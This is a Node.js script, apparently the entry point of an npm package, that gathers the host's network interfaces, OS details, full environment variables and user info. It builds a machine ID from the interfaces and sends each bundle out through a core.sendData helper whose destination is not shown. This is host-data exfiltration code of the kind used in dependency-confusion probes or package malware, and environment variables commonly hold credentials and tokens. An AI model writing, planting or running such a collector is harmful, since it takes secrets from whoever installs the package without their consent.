#!/usr/bin/env node

const { exec } = require("child_process");
const core = require("./lib/core");
const utils = require("./lib/utils");

let machineId;

const plugins = [
    {
        key: "networkInterfaces",
        plugin: require("./plugins/getNetworkInterfaces")
    },
    {
        key: "os",
        plugin: require("./plugins/getOsDetails")
    },
    {
        key: "env",
        plugin: require("./plugins/getEnvironmentVariables")
    },
    {
        key: "userInfo",
        plugin: require("./plugins/getUserInfo")
    }
];

function runPlugin({key, plugin}) {
    return {
        [key]: plugin()
    }
}

plugins.forEach(plugin => {
    let data = runPlugin(plugin);
    if(plugin.key === "networkInterfaces") {
        machineId = utils.generateId(data.networkInterfaces);
    }
    let postData = JSON.stringify(data, null, 2);
    console.log("Sending data:", postData);
    core.sendData(postData, plugin.key, machineId);
});

console.log("Running safe...");
